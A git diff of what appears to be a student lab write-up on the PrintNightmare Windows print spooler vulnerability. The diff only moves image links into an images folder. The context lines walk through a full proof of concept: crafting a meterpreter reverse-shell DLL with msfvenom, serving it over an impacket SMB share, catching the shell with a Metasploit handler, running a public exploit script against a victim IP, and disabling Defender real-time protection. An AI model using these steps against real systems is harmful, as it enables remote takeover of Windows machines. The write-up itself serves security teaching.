@@ -167,7 +167,7 @@ Affected Windows versions include:
 - Windows 11
 
 #### Timeline
-![Timeline of PrintNightmare](printnightmare_timeline.png)
+![Timeline of PrintNightmare](images/printnightmare_timeline.png)
 
 #### Identification
 A system is susceptible to PrintNightmare if any version of SMB and spoolsv.exe is running.
@@ -178,8 +178,8 @@ Get-Service –Name Spooler
 Start-Service -Name Spooler
 ```
 
-![spooler is stopped](stopping_spooler.png)
-![Start spooler](starting_spooler.png)
+![spooler is stopped](images/stopping_spooler.png)
+![Start spooler](images/starting_spooler.png)
 
 
 Use get-smbserverconfiguration to check if smb is turned on
@@ -188,7 +188,7 @@ Use get-smbserverconfiguration to check if smb is turned on
 Get-SmbServerConfiguration
 
 ```
-![check smb configurations](checkConfigs.png)
+![check smb configurations](images/checkConfigs.png)
 
 If it is not turned on use 
 ```powershell
@@ -198,14 +198,14 @@ set-smbserverconfiguration -enablesmb2protocol:true
 ##### Note that the window defender can detect the dll that will be used later which mean that will be blocked therefore real time protection needs to be toggled off
 
 ### nmap scan
-![nmap scan](nmap_scan.png)
+![nmap scan](images/nmap_scan.png)
 
 ### 3.2 Vulnerable Analysis
 At first it was discovered as a local privilege but then found out that it is susceptible to remote code execution. It leverages on two parameters in RpcAddPrinterDriverEx() as they could be run by a normal user as administrator, allowing a remote user to load a driver dll to the victim. Later, another protocol, RpcAsyncAddPrinterDriver() is also vulnerable in the same way allowing remote users to load the drivers remotely and the latter is less constrained in an attack 
 
 ## 4. Proof of Concept
 
-![Visual on how PrintNightmare works](visual.png)
+![Visual on how PrintNightmare works](images/visual.png)
 
 **Backup and Configure Samba**
 ```bash
@@ -229,14 +229,14 @@ sudo nano /etc/samba/smb.conf
     browsable = yes
     force user = smbuser
 ```
-![smb configuration](smb_configuration.png)
+![smb configuration](images/smb_configuration.png)
 
 
 **Craft Payload**
 ```bash
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.204.129 LPORT=4444 -f dll -o evil.dll
 ```
-![Creating payload](payload_creation.png)
+![Creating payload](images/payload_creation.png)
 
 **Install and Launch SMB Server**
 ```bash
@@ -246,10 +246,10 @@ cd impacket
 python3 ./setup.py install
 python3 smbserver.py share ~/PrintNightmare-CVE-2021-34527/ -smb2supp
 ```
-![uninstalling original impacket](delete_impacket.png) <br />
-![git clone](gitclone.png) <br />
-![install impacket](install_impacket.png) <br />
-![starting smb server](run_smb.jpg)
+![uninstalling original impacket](images/delete_impacket.png) <br />
+![git clone](images/gitclone.png) <br />
+![install impacket](images/install_impacket.png) <br />
+![starting smb server](images/run_smb.jpg)
 
 **Setup Metasploit**
 ```bash
@@ -258,17 +258,17 @@ use multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 ```
 ### Set LHOST and LPORT
-![setting up metasploit](metasploit_setup.png)
+![setting up metasploit](images/metasploit_setup.png)
 
 
 **Start Exploit**
 ### Run the exploit by https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527
-![git cloning the exploit](git_clone_exploit.png)
+![git cloning the exploit](images/git_clone_exploit.png)
 ```bash
 sudo python3 CVE-2021-34527.py WORKGROUP/student:”student”@192.168.204.130 '\\192.168.204.139\share\evil.dll'
 ```
 
-![running the exploit](running_exploit.png)
+![running the exploit](images/running_exploit.png)
 
 ## 5. Mitigation
 
